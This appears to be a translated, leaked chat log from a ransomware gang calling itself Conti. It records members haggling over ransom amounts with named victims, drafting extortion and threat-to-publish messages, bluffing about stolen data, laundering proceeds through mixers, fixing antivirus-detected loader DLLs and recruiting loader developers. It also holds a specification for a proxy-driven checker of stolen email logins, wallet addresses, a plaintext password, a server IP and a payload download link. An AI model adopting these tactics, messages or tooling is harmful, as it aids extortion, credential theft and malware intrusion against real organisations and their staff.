EVERYONE MUST DO THIS, otherwise the toad will stop working for you\n\nnew toad domain version 3\nodw5mdwotufuxxrgw3pvqjjuze3e33bylylkl667h4nefwiimwqsumyd.onion\n\nwe register it in the account settings - connection - server\nbefore that, on this tab, check the box Manually specify the server address and port\n\nport standard 5222\n\nIMPORTANT, everything else remains, the account lags behind with the old domain ... only the domain for connection is registered\n\n!!!

throw it in a rocket plz
can you?
sec sec
certainly
OK
tell me how to get off
already)
OK
I'll translate and write back
OK)
thank you very much
check
flew away
yeah bro!
not shown yet
if the exchange does not come immediately
Binance, for example, only after the first confirmation
well usually fast
minutes
yes, I know)
5-10
the admin panel is not working, there is nothing to do at all for now
unusually so
Well, yes, on the stock exchange you can\u2019t set a transfer fee. she exposes herself there.
By the way
found a ledger
buy tomorrow
cool)
the truth is the price of a bitch is three times more expensive than it costs
which?
X
OK)
why is it more expensive
huckster bitches local
in dns 15k
300$
well maybe grown up
this is the price they scammed me
No
I looked on their website
and don't want to bargain
bro is it just everything? I'll deal?
you know what I'm afraid that he won't fuck
well I figured it out
Why are you afraid
and that's it, the end of the cue ball
Well, I don\u2019t know what it is yet, I didn\u2019t feel it in my hands
I usually use bitcoin core
this hope
and speed of transfers
in short look
and recovery
when you create cat
they give you seed
well 24 words
you just take care of them
can be restored if anything on any ledger
ahh, is it always given right away?
he's just the key
yes, when creating a wallet
as in electrum
I thought there was no seed
understood then
Great
eat)
otherwise no one would take them
and can i restore it on any ledger?
Yes
well at least x
those. I need to buy another one.)
on s, too, most likely
well, I just found X here
okay, thanks bro. If I get it tomorrow, I'll share my impressions)
received funds?
not yet
I\u2019ll just check the blockchain
chekney
no, the exchange has not yet given
https://blockchair.com/bitcoin/address/bc1q6gj8ymnjh863gmuvh2nc3462trrvzlxf2atzxn
the market is really dead
exmo pancake
but deducted my funds instantly
not at all
they are all like that
Are there confirmations?
I'll take a look
written paid and transaction number
nothing more
is the transaction number a hash?
11252367
but
ahah
Well, then we are waiting for the first confirmation
after that they usually let her go
well yes probably
why eksmo and not binance?
To be honest, I don't have much experience.
binance fucks up a lot
never been
so exmo
well, maybe just a ride
I have worked with them for over a year.
well I'm very little with stock exchanges
I usually deposit bitcoin there and withdraw usdt
well, yes)
usually 3-5 minutes and usdt is already at the brow
I do it through bestchange
and the cue ball has never withdrawn or transferred at all
best has a high percentage
usdt there confirmations are instant simple)
and the chela transferred $ 1000 and one percent, and he gave me cash
yes, it's great
cash always cash
yes, I found this
super)
said up to 100k no problem
100k rubles?)
just need to give a day's notice
or normal
no dollars
ah, well, yes
I have up to 100kk wood per day, a limit for people
but it's fucked up a lot
ahah I personally crossed paths with him three times
well, I\u2019ve withdrawn 10k so far so that half the loan can be extinguished
every time on a new car
Ha
sut
not
he's just dumb
well, people generally tell me you translate me in advance
well i do that too
and then I'll come and give you the money))
for the first time we only worked on the spot
right now I\u2019m translating just to come pick up without waiting
well, yes, I'm also the first time ... well, norms topic by the way
they have no reason to throw
well, if he throws, then I xs what to do
I can only ruin a turnip
my village is small) found out where he lives
if I still catch))
ahah
that's it)
turnip means a lot in such matters
\nYes
we have three of them
two guys and a girl
and they damn well know
I'm in total awe
ahah
listen, the exchange has not yet translated
no, it's empty
damn it, at least translate until the evening, otherwise you will sit there without money
ask for hash
yes i think it will be translated
well I have a little
I don't know how to ask for that hash
I have in my phone
30-35k
enough for today
relax)
well, if it doesn\u2019t translate until the evening, then I\u2019ll think of another way
dont worry bro
there I'll get to a normal cat
I'll figure it out if
not in a hurry
OK
yes wanted to help and as always
all through the ass
markets are always
no reason to worry
send, just fuck your head
well, this is my inexperience, I don\u2019t really work with them
on
ok let me know how you get it
so I don't worry here
certainly
THX
Well, I check every 20 minutes
so beacon
well, yes
most of the time it doesn't make sense

For each of the options in item 9, we try to open a connection through a randomly selected socks server (item 2) and log in using the existing email and password.\nIf it turns out to be authorized, we send a test letter (p. 4) to a test mailbox (p. 3).\nWe enter this checked email along with the current time in the pending list (those for which the result is expected).\nThese checks are performed in several threads, the checked list is divided accordingly.\n11. A separate thread checks test mailboxes (item 3) using the IMAP/POP3 protocol.\nFrom: all incoming emails are compared to the email in the pending list. If it matches, then sending through this account is working.\nSuch an email is entered in the output list of suitable ones.\nIf during the timeout (point 5) there was no incoming from this mail, such an email is entered in the \"timeout\" list.\nIn all other cases, the email is marked as invalid.\n\nREQUIREMENTS\n12. Work under OS Linux.\n13. Implementation language - preferably Python, other options are discussed.\n14. The overall goal of the checker should be to reduce scan time. As many checks as possible per unit of time - taking into account multithreading or whatever.\n\n\n \"The C Programming Language\" by Kernighan Ritchie

frets
while the bitches are silent
I wrote to them at 4 in the morning
and they are all silent
look what the bank threw out
tell me your opinion plz
Yes I saw
this is normal
quite
they don't want to pay a lot but have to
just beautiful to understand them
increase your offer by 5 times
all
yes the bank will give 3-4kk
I think so too
next time tell you 50% discount
of the total
and this is beautiful
edge
given that you do not need a cryptor
no, you just need to write, for example, end the price for you 3700% is 50% more of the price, but this is the last price if you want to agree, pay
did not understand))
but okay
come on
busy
well, you can write later if you want to hear our last offer, then this is 3700
Trumpych, today I\u2019ll leave somewhere at 17.15 and I\u2019ll be back in the evening, for hours by 21.00
all below we will not release the price after just posting
skippy will insure for me
frets
OK
yes understood
but I think not lower than 4kk
you can 4kk
write
yes it will be better
OK
they will raise the price
and meet somewhere at 3.5
well it could be
you have more experience
eh, not but I made a bet on them that they would pay more than 5kk)
Who is there with us, we still have to stupefy the shogon?

Hey
how will the beacon appear pliz. you need to think about what to do with HDP. They insist on the transfer of their data. I understand that these morons most likely deleted the encrypted files and were left with nothing. Therefore, they need to upload their data somewhere, send them credits and let them go to hell on all 4 sides.
The main thing here is not to crap your reputation now.
\n\nhello, the cue ball is over, a total of four new servers, three vpn subscriptions and 22 renewals have been released. two weeks ahead of renewals for $960 in bitcoins 0.017. Please send bitcoins to this wallet\n\nbc1qtdyul6azg4lfecpkyaq3gdvpypxgz2ap8cgd5f\n0.017\n\nthanks

Do you need a data deletion log?
on a kobu the data deletion log is necessary?

[12:05:35] <skippy> damn, you threw off the can very sharply\n[12:05:44] <skippy> I left room for maneuver\n[12:05:49] <skippy> to lower it to 4\n[12:06:01] <skippy> 5200-5-4600-4300-4\n[12:06:11] <skippy> right now 4500 and xs\n[12:06:20] <skippy> and they only have 1750
well, I thought up to 4 maximum
then everything
50% and cross
those. from the bank we must rip 4kk
I don't think it will work anymore
well, yes
and now they will give 2
so next.4400-4300-4200-4000)))
like this somehow
ahah
Yes))
comics paid off
I don't want to drag at all
Yes
I got paid at 2 am yesterday
no, the bank is such that they are just toffee
ok yesterday was a day
No
Look
by bank
I suggest this
I just made a deal with the Germans
4k - 50% and that's all the guys, we closed the auction
then we post the data
and all
well maybe in theory
but it's after the weekend anyway
otherwise it will be before the second coming
not at all
a week usually
they have another day today
they won't do it in a day
u means we will pull until christmas
and we still have not transferred 250k fag those
keep silent
I don't think they will translate
I also freaked out yesterday
we have a bug in the panel
and those companies that do not write to us, in fact, cannot write simply, in the bug panel
this is such bullshit
fuck off
today the programmer must bitch eliminate it
Yes
if they don\u2019t translate, I\u2019ll say the same
and I fromuk fucking already posted 40%
hid everything yesterday
consider gave us 750k
well, yes
they need to give a hard time
what if 250k is not paid today, for example
then tomorrow the data will be online and thanks for your gift))
they have time
till Friday
and this infa is
so today is the last day the banks are open
These are their problems
and from Thu to Mon they have days off
))
well, yes
shake reshaev, let him pay you salary
it worked out so well
and you will be even more decent)
he sent me 19 yesterday
for two targets
well, cool
waiting today 16)
and today somewhere the same
yeah
well, yes, and I'm 20 in three
guuut)
cho consider clap and a half lama tree
yes, I\u2019ll just close the loans before NG and as a person I\u2019ll go on holidays without debts)
12k paid, another 12k in December and that's it, cheers)
and began to save for a square
handsome)
already made a preliminary deal for the purchase of land
next week I will finish it) and a start has been made
you can put up a tent and live already)
ahah
nobody kicks the bitch out
it's true)
the next thing I will build is a bathhouse
with a guest room to spend the night
and then I'll take care of the house)
damn plans pipets)))
you need at least 3 cue ball for everything about everything
ahah
yes, same shit
Well, have you saved up yet?
already on 2/3 of the house it should have been
accumulated
finished yesterday
construction site?
not
piggy bank
)
withdraw the required amount to the ledger)
Yes)
well, yes, the cue ball is now dipped
it's not good to take it out
I think it will jump to NG
and then it will be possible
I'll take you right away
at usdt
on ledger in usdt?
Yes
certainly
he supports yes
But is it possible to use a cue ball on a ledger?
it's just an ethereum token
usdt
btc yes
i accept on ledger
well, I want what I have accumulated so far to start everything on the ledger in BTC
and then when it is higher, transfer it to usdt
so it is possible?
certainly
those. as I understand it, I myself put on the ledger through the application which crypto to support, right?
Yes
and I create a wallet on it
choose several
Yes
well, I will choose only btc and yusdt
all
and I will send each other)
I have btc usdt and ether
ahhh
it can't
ether is needed for commissions
this is not a stock market
by usdt
will be able
there is an exchange
those. ether needs to be put
and tre20 use
but in any case - from btc to monero you must first
my cue ball is already clean
only ers20
will be on the ledger
at the ledger
clear
well, they did it badly, the exchange is much better in this case
I don't believe bijas as a wallet
for storage
agree
where is the exchanger located? in the application?
Yes
but I don't use
those. I can translate from btc to usdt directly from the application
how to top up ether?
maybe
same exchanger
btc broadcast
not so, but automatically it will not transfer from btc to usdt
You need money to be on the air, right?
money on the air is needed to send usdt
he takes a commission from ethioa
everything is clear now. everything is connected to the air
like blockchain
certainly
a token is a token
clear. well, yes, for each transaction at least $ 25
and wait xs how long, you can and damn it for a day
i mean how much
2-3 minutes
never been again
2-3 minutes
i mean how much
never been again
I again have trouble with the AB detectors. generic is clean and rundll32 is dirty

Cho have us quietly until see?
yesterday I sat for half a day
answered
Yes
peace and quiet
and blogs made on brand new
when you answer look carefully please
Lots of typos and grammar
we need to be perfect
in details
Yes
then
these are trifles
there you screwed up
where?)
when file tree suggested
for the future
ask before you offer
and see the amount of data
to whom
BSCR
I had to compose garbage so as not to throw off
there is almost no data, and those that are all old))
2016-2018
fuck)
I couldn't even blog about them
one fuck
so keep that in mind
so there is even a phrase about file three in the start
fucking
and mistakes and stuff, this garbage is all
well, you need to avoid somehow
otherwise it's a fiasco
if they realize that we have no fucking data))
:-D
and faggots who paid part, fluid, something in no hurry to pay the rest
I gave them time until today
means to post them tonight
and FSUs
In the evening I'll lay out the fuck if the rest is not paid
Yes
right
[ERROR: This message is encrypted, and you are unable to decrypt it.]
another fucking panel
replaces the characters itself with some crap
as a result, the password was thrown off and the panel was replaced)
in short some shit
and I still have suspicions that not everyone can still write to the chat
i dont know how to check it
but I have a deep conviction, otherwise where is DOMKIS???
they asked for a decrypt
and disappeared after changing the panel
also ACNE
something strange
it replaces the sign '
acne testili
and not only
look at the password
copy and paste
you end up with something completely different.
although there is no apostrophe
pzdts
Yes
at least through a private message
I don't understand what it replaced
yes, now it's better to send passwords and other things through the privnot
+++
accepted
well, today the main thing is not to fuck the bank
you need to strangle them to 4kk
what do they have
but
Yes)
Here you go
the rest seem to be trifles, but I also think we will strangle this week
http://198.244.193.210/images/wolf.png
rob141.exe
where are you saying I'm badly written?
seems to be ok everywhere
OK, We give you 3 days, after 3 days we wait for the payment and no more time requests from you.\nOK, we give you 3 days more to make a payment. No more additional time requests.\n\nSorry, but we cannot give you the files list, because the remote server breaks the connection all the time. But we have your data from bscrna1-fs1 and WILKERSON-NUC servers, so you can evaluate your data.\n\nwe are waiting for your offer till tomorrow. The offer must be satisfying for the both sides.\n\n - your data will be published within 17 hours.\n\nYour data will be published today evening, if YOU don&#39;t pay.
:)
very much
all good except the last one
yes, missed the suggestion
or easier - today's evening
yes apostrophes swallow panel
pyf.)
I know
Yes
then just today)
let them row
today in the ev
at 29.10 evening)
yes whatever you can
well yes yes
as long as the grammar is not lame
Well, I forgot a lot of course, the last time in 2008 I used written English)
&#39; - apostrophe
Yes)
#38; - What is this symbol?
and replaced twice
I'll take a look
look)
https://ascii.cl/htmlcodes.htm
this &
pass: #%Cbgc(#QT&#38;*$YXQW6cbyhf
look here was the password
#38;
&#38;
this shit added
instead of what?
#%Cbgc(#QT&*$YXQW6cbyhf
is this what the password should be?
da, dumayu da
or without &
?

Yes, but only when you choose an exchange

Hey
same problem again
there are no our software workers
????
you need a decrypt from them, otherwise the fluid has difficulties, Linux files cannot decrypt
so they will definitely never pay us the rest
empty messages are coming
Hey
yes i read the chats
yes, something is not very good, somehow work has been going on with these guys lately
Everything was clear before
well, it\u2019s just that when you yourself sit regularly every day, and here people in the hole are not happy
it started after the crash
damn, is it possible for you to take a decryptor from them?
Yes, it would be so simple) I would have already sat deciphering
this is their bread
clear
well, we are waiting
unfortunately there is nothing left
for the New Year holidays, I will write my encryption software and in a month we will start working on our software
these issues need to be addressed as soon as possible.
and your panel will be all yours
I fucked such a frost in my mouth
Well, great, maybe you will raise me there by 1%)
I agree with you about the cold
it's not work
I suggest not to fuck the bank anymore, now they will make an offer and agree with what is
let me raise it
let them pay
by HKI
you've seen
you already get 1% with my bonuses
is not it so ?
how much did they offer?
then all bonuses will be canceled immediately)
Yes! with your bonuses bro
thank you for this
I suggest not to fuck the bank anymore, now they will make an offer and agree with what is\n just like that or they will jump off
Skippy needs to be warned
your 1% comes out and so
and then he will overtake them
you get no less skippy don't worry
yes it probably comes out bro
I understand everything
I didn't think so
you should make your panel faster so that you yourself can work as a carpenter
we started already
we will write day and night
everything will be OK
I'm not a bit sorry bro, thank you for pulling me out of the swamp, I even began to breathe
it's just the software itself that matters
to encrypt well
there will be many difficulties
break through
but everything is solved
well, there's still a lot of work to be done.
I can test your software
if needed
let's make the software even more cheerful let's go ourselves
made a gift to myself yesterday
bought a laptop
so I can now put the virtual machines of the norms
zbs
Congratulations
well done!
thanks) sorry)
Well, there was a reason, once in my life I made a gift to myself)

grandmother through the mixer skip these
then output
be careful overall
yes i miss everything
the most dangerous thing in this business is this money
without exception
the main thing is that the mixer does not fuck
that's what I'm afraid of
they will search only for the withdrawal of attendants
the main thing is that the mixer does not fuck\n the mixer also pours all sorts of garbage
I don't know what others are putting in there.

wanted to see ... looked)
everything is hanging
does not open anything
well, yes, on purpose
special services
in short trouble
don't say
here's another big trouble if these two software developers do not appear .... with a decrypt then we'll shit ourselves
it's probably the worst it could be. and so hardly sailed at BSCR
yes they will come
empty messages are coming

where did the horse go
bots are coming
[Error: The message is encrypted and cannot be decrypted.]
accesses gave reverse and dooms for work
what to do with a locker, on which one to work
this is one of the main projects
we have bots with Veyron
everything needs to be dealt with promptly.
great hopes are placed
OK OK
I'll decide everything right now, and I'll start
[Error: The message is encrypted and cannot be decrypted.]

got?
Skippy, buddy, where are you?
Skippy, don't write anything on the jar, even if you need an answer. It is important!!!
Hey
here?
ghbdtn)
Hey
Wow
why
then look, according to the bank - how they will give an answer with payment - we agree
why did you agree to 1150?
understood
because they don't have a date.
8GB
we won't get anything from them.
I should have at least 1300
there is a high risk of overdrawing the bank
so we agree on their price
according to the bank, that is, they give us, for example, right now 2200
and all
we are so ok
right,
?
like so: Ok, we are agree. $2,300,000. The BTC-wallet for payment:\nWe are waiting for the payment today.
well 2,200
those. the price they charge
well their price
understood
Yes
here
and the issue with them was closed
something fell off
you need to close with everyone as much as possible
it makes no sense to roll wool
duck of course
everything has already been decided with trump
ng soon)
Yes
in short, I'll leave
well, how's everyone
I will be closer to 20.00

I saw that they wrote BSCR)) 110k instead of lam
Yes)
what will you answer them?
I don't know yet, I think
but definitely 110k is not satisfied
ugh, i don't know either
but in fact we only have a decryptor
yes, there is no data at all, I couldn\u2019t even make a blog
fuck)
there is one bucket 2016-18
those. garbage full
poorly
therefore, leading to data is dangerous pipets
+++
here you need to be careful somehow
one more thing - they wrote that they themselves can recover most of the data
Yes
you can play the idiot
lose
type 110k is not enough
ahh
well yes yes
no, not saying anything
like our decryptor costs at least 700k
just give the amount
no no
and plus a 200k guarantee that we will wipe everything
just say that the decryptor is more expensive, even just development
i.e. stupidly just give 110k a little more?
like 100k is not enough\neven just a pentest for a company of their size is more expensive\nnot to mention work and guarantees
but we understand
and so here's a discount for you
8ok with you
well, yes, the sooner we finish with them, the better
it's good if you manage to take 500k)
++
I think so
I think 400 to be honest
well at least how much
just no date we suckers

Guys, you evaluate the our team very low, $100,000 for us is not money. Just development of our decryption tools (for Windows and Linux OS) cost more than $500,000. Our guarantee of wiping data has own price. We give you some discount and our price for you will be $800,000.
look
I don't really like it of course
stop
didn't go
so I didn't mean to

Sirs, seems like you are evaluating our work too low. Even a simple pentest for a company like yours will cost more than you offer. Multi-platform decryptor development, work of a lot of people... Plus our guarantees are not free, as you understand.\n\nHowever, we understand your harsh situation. You checked an info about our organization and it looks like a positive trait. So, we are ready to make you a discount: from now, your price is 800,000 USD.
like this
well send
just confuses me
one thing
no one asked to do pentest)))
that's why I didn't want to write anything about pentest
dak done)
ahah
well, the answer is asking, we didn\u2019t ask to do a pentest, why should we pay for it)
I'm here for
ok fuck
they asked not asked
and already done
and type they will receive a report
after payment
yes fucking they will not receive except for the decryptor
well, we'll give a report)

Take builds from the paranoid
yes you are a little rushed with the bank
should have said 2800
Well, we decided initially that we accept their next offer. and I think they did the right thing, since they were already losing interest, there might not have been a next proposal
trump, a tit in the hand is better than a crane in the sky)
300k won\u2019t play a big role for us here, but the fact is on the face! remember how nervous you were and wrote where the fuck is the bank)
I knew that I could pull them out again, but this is extreme
okay, controversy, you need to remember that the greed of the fraer will destroy.
just trust my experience
So bank +, HKI +, fluid +
they would go up to 2800
waiting okay 2500
everything's Alright
who else have we missed?
Throw off pliz fluida log
that screwed everything up
*removed
AND_NBA_04801+, HKI+ while waiting
how do you do them by the way?
[13:51:34] <tramp> AND_NBA_04801 +, HKI + while waiting, yes
soon busy
targets are flying, you need to catch and twist
in the evening we will throw them off they will wait
I understand, I'm not distracting, just tell me the fluid didn't scatter money?
there 250k
Not yet
well, 750k was the same before
they also did not seem to be scattered
or I xs already confused pancake
750k - it's already scattered and you were paid for it
OK
SGIDC put up 11.3kk, I wonder how much they will offer. maybe they can squeeze out at least 5kk
something really hard they fucked up from the amount

will we pour today?
Trumpych, HOULEELEC asks about the price
which one shall we give them?
if I'm not mistaken, you put them somewhere either 7 or 8 million
right?
Hey
do not remember how many exhibited Huulecu
I wanted to say that it's time to pour the fluid
no, paid
ytn
No
they paid
Yes)
I don't remember hululu
do you remember how many Huulecu exhibited??
they need price urgently
[16:23:15] <fire> I don't remember hululu
if my memory serves me right, then 7 or 8 million
minus 20%
let's get them 5.5kk with all the discounts
what do you say???
did you check their turnover?
well, like 274 million
HM
well, you know that this is a conditional crap
well you can
OK
what shall we write?
anyway
discounted 5.5
Yes
OK
I'll take a look now
then with all the discounts we set them 5.5kk
will it go?
I have eaten
I'll take a look at what was on them
274 million
you wrote in the chat

No
I kept them

and they are fresh
Yes
latest most
Yes
$5,500,000
I already fucked up

I don't think they can pull anymore

I think they already have a solution
guys will start knocking on the new panel now
I remember exactly what it was 8 million
4 grids have already been installed on the new panel
cool
6 more meshes in progress
gotta get them before christmas
we will install from 10 nets per week
10+
fuck yourself
Yes
well done
let's do our best
Yes
then I understand on vacation
Or how is it accepted in our team?
hihi
Yes, let's rest for a couple of weeks for sure
I'll see how the guys feel about the state of the team
OK
last year rested for a month
New Year's holidays
yes, that's good
we were leaving from December 25 - 28, everything was put out, I stayed in touch since I conducted the targets myself
and in February they were launched in the first days
Here is the plan for this year
Well, I'll help you.
next
now 10+ a week and everything will be as good as last year
well i'm not resting anyway
Yes, sure
maybe next time you will be lucky
I don\u2019t know what other teams started messing around and went off
only lose $
well, apparently the team leaders are already pointing out
well, that's good, we have less competition
or they know more than we
I still do not understand how the IP address of the real server was calculated where the panel was the previous one
it means that the Tor nodes have their own servers
and we somehow got on them
could hit the node of the curve
I raise specially such nodes
it could be the same here
Yes
it's all bullshit
the main thing is that the guys raised everything and we didn\u2019t miss the targets
Yes
Wow

yesterday I asked you to prepare

little taken from hki (
they need to drop everything
Well, if they would have traded further, then I think up to N.G. would probably have pulled
well yes there is
well, you and I decided
that the norms are enough for them and close the question
wrote to the paranoid
he had to prepare everything for them yesterday
delete your blog
write that the blog was deleted
Yes already
OK
now the decrypt will be given to them by a paranoid

now I will give 1 landing for html file\n\nand then I\u2019ll make 1 more landing, which will be for the letter in which you directly embed html
jr
you will make a log on a zatirka of the data?
Yes already
and tell me what are you doing plz
did you learn how to do it yourself?
well i used diskwiper
I don't know how on linux
That's why I'm asking just curious
[20:29:08] <bio> BSCR dropped 15 files or 17\n[20:29:12] <bio> all 21 years old\n[20:29:30] <bio> financial, budget, pictures, ID well, the rules are shorter\n[20:29:43] <bio> then you need to move away from this by any means)\n[20:29:51] <bio> is the best I could choose
login via ssh
press M+C
and then there is the matter of technology
I'll show you
there Lavi.com <http://lavi.com/> was unsubscribed in the second chat\ntext them now
there is a file tree it should look like
OK
shcha
They have a lot of data, don't you remember?
and then something you have no notes
I don\u2019t know, I didn\u2019t set it, but we have the second team
they will put
poorly
will put a mark
go until where the date lies on them
I'm going

here is the deletion log
re-upload it and give it to them
fallow there show-off
why reupload?
wait one more time
trump explain, otherwise I did not understand anything
<revers> hello no, he promised to fix something there so that we could load the dll
well, if you download files from this file exchanger now, they will automatically delete them and you will need to re-upload them with a new one
and give them
Hey
if you want to see how the deletion takes place via ssh connection to the ftp server
OK
THX
so that I wouldn\u2019t do it later and you did it yourself
is there an instruction?
)
connect to ftp via ssh
no it's just a picture
our cyberboy wrote, asked for a cat
throw for HKI?
not ready yet?
I'm already testing
5 more minutes
yes and for fluid
OK
So
problem
LAVI
I already counted them
I can't make a tree
what is there?
why ?
tree
not installed
put
no root
how to put that
I'll tell you
Hey bro answer my guys please please servers
I don't understand\nlike the software is working, but I don\u2019t see myself in the panel
online
Hey bro answer my guys please please servers
IP?
maybe i blocked
86.105.9.13

put it there
No (

not immediately knocking after a minute
about

dll is running
hangs in processes?
rundll32 ?
https://ibb.co/vHDmjhx
yes, hanging
and here is the error
Throw hki text how we hacked them
sec
oh oh weird
I'm talking about standard text
and I will send you a purse for a bonus
yeah
this crypt screwed up something
and of course the dll crashed after launch\n\nand you did not test dll after the crypt?
try resetting the system
tested
she works for me
roll back and run again?
I'll give new links
try from there

hai
xs\nI don't knock apparently
maybe I have something with the VM
but the installer works fine
is there an error now?
well what is there?
post the link i'll take a look
the tree will be extremely small
there are not many files
no error now
rundle hanging\nI'm waiting, maybe it will come to life
we wait
as if restarting rundll32
but the process hangs, does not throw an error
strange give me the link I'll check it out for myself
minute
then upload this build to production
and give a link
here again rundll restarted as if)

Cool!!! Thanks, Trumpych
shcha
++
we work
certainly
for the new year you need to take a square
but you need to understand what to do with LAVI
goal set
yes i would like a square
and then also repairs in it)
make LAVI and say it's only 30% of your files that we took
oh i think i'm online
I think
the same rake...)
well there is no choice
yes yes I agree
they are fucking principled
Yes
you can change exactly to this landing, it is working and up-to-date\nI went to make the second version to give you an html letter\n\nwell, and make spare accounts with landings in order to deploy everything faster (preferably within 20-30 minutes
what about crypto?\n\nAnd another question - can I take 10 Azura accounts yet?
bad, sorry
OK. no problem. Without full file tree
full
they will not talk if we throw off 30% or part
yes we will fuck
well they need to write hard then
say you will receive a full derefo of files only after payment if you refuse 30%
does the installer choose the language?
It is your right
Do you think it's the way to play?
well, yes
yes, system
or let's fuck with the date
how else
skippy where
bot knocked?
with what language the system - with that the installer will
yes, i slacked off
did you delete yourself?
I don't know about you, I haven't looked)
I knocked for a long time
just thinking how to argue why 30%
Not yet, I'll delete it now\nthis is VM
I couldn't find it by IP.
86.105.9.12
here's what I got away with
damn they are tiny
there 800k total declared
already got a discount
I can give accounts tomorrow
OK
the first time I ran with this vm - there was this sp\nnow launched (but the ip is already 86.105.9.13) and he tapped into this bot
well, whatever you want
and you didn't send the crypt
you still don't understand
we'll see along the way
yes understood
you have to bend your line
everything's Alright
OK
stats show the first ip with which he knocked, and not the last
they will see their data in the publication
but he still rose for a long time, this SP also did not immediately tap
accounts - no problem\n\nDamn, that's right, I already ran and forgot)
now, 10 minutes and came
there we have a breakdown in crypts only tomorrow I can do it
roll over servers.
((((
fak(
ok, I'll wait
Okay bro. Sorry I can't do
no problem, i understand
By the way, I don\u2019t know what the amount of data should be, but there are a lot of them
how long does a tree make))
go ahead
maybe already done
nope
buggy happens
running
ok
no, it's clear
+
the files are new and everything runs clearly
I'll tell you how much
bank on the way
estimate, I think 30% is not worth mentioning
OK
well we'll see
[Error: The message is encrypted and cannot be decrypted.]
just throw it off without writing about chat
if they start yelling a little let's say this is part only
you can go from this side)
OK
here
steer clear of their reactions
already a better idea and I think so
++
so also, on the new panel, will we make blogs on them there or what?
did you change the link to a new one?
Yes
but something with the server or crypt dll
look
ok, great\nI'm already making a second landing and under the letter I'm making a landing right away\n\nsounds bad, right?
my process hung for about 10 minutes exactly, before I tapped into the panel
maybe even a little more
look
trumpych and make a log on the fluid pliz
already throw them off and fuck them in the ban
and a report on how they were hacked should be taken from you. left on another computer
I sent you a standard report
throw it yourself
there is a big text
Well tomorrow I can
I can't make a tray file, we deleted everything
no you don't understand
I'm talking about fluid
trey we won't do
trey HKI asks
aa
You said that was only 30% though. Where&#39;s the other 70%?

Hey
who are you? why add?
xs, as if for work, they added me to do xls
ah ok
Hey
here?
doc start?
I understand that everything needs to be discussed with you?
yes you can with me
on what conditions did you agree with the ford remind pliz
I need you to collect a dock on a subscription for one of our advers, but it is necessary that everything is always clearly on schedule
usually Mon-Fri in the morning
hours from 10 11 to Moscow time
well, look, in general, I do 400 per build, but we agreed with your support that it will be 300 permanently
Yes, I'm ready to work without jambs
super excellent
veron@ add
for him to do
when to start and what about the payment?
he has a loader there that is not confused by crypts
emote if heard)
agree with him on what date you start
and to me for payment
oke
I'm like a local sheriff here :)
I already understood)
Ford generally said who we are and so on?
No
Yes, and if it\u2019s not so important to me, I realized that you are working on grids
Yes
gang trika we
conti
etc)
yeah)
well heard
Here you go
our software is not particularly confused, there are no nuances
if current by entry points on dll
but usually we warn if there are features
Are you just building a dock or are you doing something else?
yes i can also do vbs and js
in
Are you generally strong in JS?
I really need a smart zhs encoder)
yes, not really, I also just have my own encoder that helps when needed
understood
pliz ask him if he wants to make a js loader for us
and how much would it cost
so I have it)
Well, do you have a pure dropper?
or straight loader?
is there a fix?
yes, I have a loader, but the executable file itself can be vbs js xls and doc and hta
what kind of fix? some kind of loader?
well, that is, it\u2019s right here resident, after restarting the PC, the bot will not disappear
resident of course
Great
do you ship it yourself?
does anyone else work on it?
I'm the only one who still makes traffic from Google for it
dino@ will dock for you when you are ready to test
the dock is normal, until I met better
understood
added your forehead but apparently he is not online now
I need a fix for one of the commands
Is it possible to arrange a job/rent?
he doesn't answer often, he's busy
most likely on monday
answered
said that today we start
oo
Great)
We've been waiting for it for a month now..
I will give another chela - test the loader with him, if it suits him, then we can work on this topic
Hey
ok now I will then do what to pay you once a month payment or what?
you will get hit by me
with loader
for every taste, xta zhs vbs
plz test if everything works let me know
dylon@
oh shit
dylon@
this is according to the loader
payment at your convenience
usually salaries for everyone 2 times a month on the 1st and 15th
but we can do it at your convenience, at least once a day
I'm just not always in touch, if something has to wait
during the day there
dino@
add it
so pay now or when? he just told him to collect the dock
just for the test I already did to you
are you here yet?
if I will do the grid you what% can I get?
I'm here
soryan distracted
let's pay right now leave the cat
he did not test, it was my testers who looked at the ford
[Error: The message is encrypted and cannot be decrypted.]
leave the cat I will send a little cabbage so that you are calm, Verona pliz maximum attention, I will pay for all the inconveniences if only he would be happy :)
for nets, usually 25 for nets with hell and 15 for nets without hell, provided that we do everything
date, lock, negotiations, osint, etc., etc.
[ERROR: This message is encrypted, and you are unable to decrypt it.]
but if you are with us for a long time, of course we will give you something by a percentage
[ERROR: This message is encrypted, and you are unable to decrypt it.]
30 and 20 can be made, but not immediately, at least there the first payments 3 must be received
when locking, we give an ID and access to the chat according to your user, you can watch the dialogues, whether the grid is connected or not
but you don\u2019t need to write anything, trained people are sitting there, they know what they are doing
I can just rent a locker if I have my own hackers
[ERROR: This message is encrypted, and you are unable to decrypt it.]
[Error: The message is encrypted and cannot be decrypted.]
it\u2019s not easier for me to work with you, I just if there are nets I will give
bc1qdvmlyvaq46e53r8y6e4cyj4pq8cdf8fukj82x0
yes, okay, write either to me or I will give a team lead from some hackers - they can directly
here is a dilon by the way who I gave
oke
Yes, he's normal type with him and start
and there, if anything, I will give more people, we have a lot of hands
Okay

Conti team - we have 2 cases with you that client paid and you did not deliver. Who to speak to, email, telegram, tox, irc whatever works because clients are beginning to believe you do not deliver. Can you reach out to me miroslavpopov1980@outlook.com\n\nor this is not good and we have to tell clients you are not trust worthy and we prefer not to do that.\ntramp@q3mcco35auwcstmt.onion
Here is the text they wrote in private
need these bugs
I can't really understand
what clients is he talking about?
who didn't we give? did you take the money?
is it about us in general?
are you busy right now?
Well, you need to write to them by mail then, but I don\u2019t quite understand why and what to write
yeah i dont know i wonder
someone Sonti threw a campaign
let's write yes
well, a couple of companies
from their words
make mail for them
2 cases
Okay
find out who they are talking about and what the conti did with
I'll create a mail
OK
let's then reset access here
and write to them
OK
then when these Gavriks come, we'll talk to them
+
is a negotiator who negotiates from several companies
he knows something
gotta get it out of it
well, we'll find out. OK
it's bad that someone does that
Yes exactly
it will be very difficult if we lose trust
it's a reputation
certainly
and now this has not yet affected the result specifically with this ratget, but maybe for now it\u2019s just a delay in resolving the issue
well, let's find out
fillemand@protonmail.com : sgffj*&^#Jji%#^&$
write to them immediately
then I\u2019ll just write that we keep team and you asked to contact you by email
Yes
ask the question immediately about whom they are talking about?
and add what two cases they are talking about, let them explain in more detail and like we are ready to help
OK
do I write to this box? miroslavpopov1980@outlook.com
Yes Yes
by the way, squeezed out with BSCR less
da
everyone needs to be pushed like that
skippy said that it would not work and 300k
))
well it turned out damn)
well mother write
let him write and make a decision all the same to me
Well, I wrote there mostly
you need to squeeze everyone and they all fuck
